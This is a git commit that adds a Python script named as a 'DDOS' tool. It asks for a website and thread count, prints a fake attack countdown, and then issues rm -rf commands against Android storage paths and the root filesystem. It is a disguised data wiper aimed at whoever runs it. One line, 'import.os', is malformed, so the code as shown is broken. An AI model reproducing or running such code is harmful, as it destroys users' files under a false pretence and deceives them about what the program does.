fd226e6c5273e6822ca3387ca4b733bcff4c5419
Mr.V1P3R <109334868+Knownasjohnn@users.noreply.github.com>
2022-09-24 21:55:53 +0800

    Add files via upload

---
+++ V1P3R_DDOS.py
@@ -0,0 +1,22 @@
+print("V1P3R DDOS")
+
+
+input("website link:")
+input("threads:")
+
+
+print("starting attack")
+
+for y in range (10000000):
+	print("[*] attack status ===> ",y," sec left ")
+ddos = input(" attack done press enter or type exit;  ")
+
+
+import.os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
